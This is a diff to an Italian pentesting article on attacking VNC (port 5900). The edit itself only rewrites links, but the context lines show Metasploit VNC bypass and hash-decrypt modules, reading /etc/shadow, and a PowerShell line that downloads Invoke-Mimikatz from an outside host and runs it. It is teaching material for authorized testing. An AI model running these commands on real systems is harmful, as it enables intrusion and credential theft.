@@ -18,7 +18,7 @@ tags:
 featured: true
 ---
 
-VNC (Virtual Network Computing) è un protocollo di condivisione desktop remoto che opera sulla porta 5900 TCP (display :0). A differenza di [RDP](https://hackita.it/articoli/porta-3389-rdp/) che è nativo Windows, VNC è multipiattaforma — gira su Linux, Windows, macOS, embedded systems e dispositivi industriali. Nel penetration testing, VNC è un target ad alto valore per tre motivi: molte istanze girano **senza autenticazione** (accesso diretto al desktop), quelle con password usano un sistema di **hashing debole** (DES con chiave fissa, crackabile istantaneamente) e il protocollo trasmette in chiaro — qualsiasi password o dato visibile sullo schermo è intercettabile via sniffing. VNC è ovunque: server di produzione con accesso "di emergenza", macchine di sviluppo, sistemi SCADA/ICS, thin client e kiosk.
+VNC (Virtual Network Computing) è un protocollo di condivisione desktop remoto che opera sulla porta 5900 TCP (display :0). A differenza di [RDP](/articoli/porta-3389-rdp/) che è nativo Windows, VNC è multipiattaforma — gira su Linux, Windows, macOS, embedded systems e dispositivi industriali. Nel penetration testing, VNC è un target ad alto valore per tre motivi: molte istanze girano **senza autenticazione** (accesso diretto al desktop), quelle con password usano un sistema di **hashing debole** (DES con chiave fissa, crackabile istantaneamente) e il protocollo trasmette in chiaro — qualsiasi password o dato visibile sullo schermo è intercettabile via sniffing. VNC è ovunque: server di produzione con accesso "di emergenza", macchine di sviluppo, sistemi SCADA/ICS, thin client e kiosk.
 
 La porta 5900 corrisponde al display `:0`. Display aggiuntivi usano porte incrementali: `:1` = 5901, `:2` = 5902, e così via. Alcuni server VNC come RealVNC usano anche la porta 5800 per l'accesso via Java applet nel browser.
 
@@ -240,7 +240,7 @@ use auxiliary/admin/vnc/realvnc_41_bypass
 use post/multi/gather/vnc_decrypt_hash
 ```
 
-Non serve [Hashcat](https://hackita.it/articoli/hashcat/) — il decrypt è deterministico (DES con chiave nota), non è un hash da crackare.
+Non serve [Hashcat](/articoli/hashcat/) — il decrypt è deterministico (DES con chiave nota), non è un hash da crackare.
 
 ## 5. Post-Exploitation — Dal Desktop alla Shell
 
@@ -273,7 +273,7 @@ cat /etc/shadow  # se sei root
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.200/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
 ```
 
-Per [Mimikatz completo](https://hackita.it/articoli/mimikatz/) e [DCSync](https://hackita.it/articoli/dcsync/).
+Per [Mimikatz completo](/articoli/mimikatz/) e [DCSync](/articoli/dcsync/).
 
 ### Keylogging via VNC
 
@@ -383,4 +383,4 @@ Nel traffico intercettato:
 Riferimento: RFB Protocol specification, HackTricks VNC, OSCP methodology. Uso esclusivo in ambienti autorizzati.
 [https://www.pentestpad.com/port-exploit/port-5900-vnc-virtual-network-computing](https://www.pentestpad.com/port-exploit/port-5900-vnc-virtual-network-computing)
 
-> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
+> [hackita.it/supporto](/supporto) — [hackita.it/servizi](/servizi).
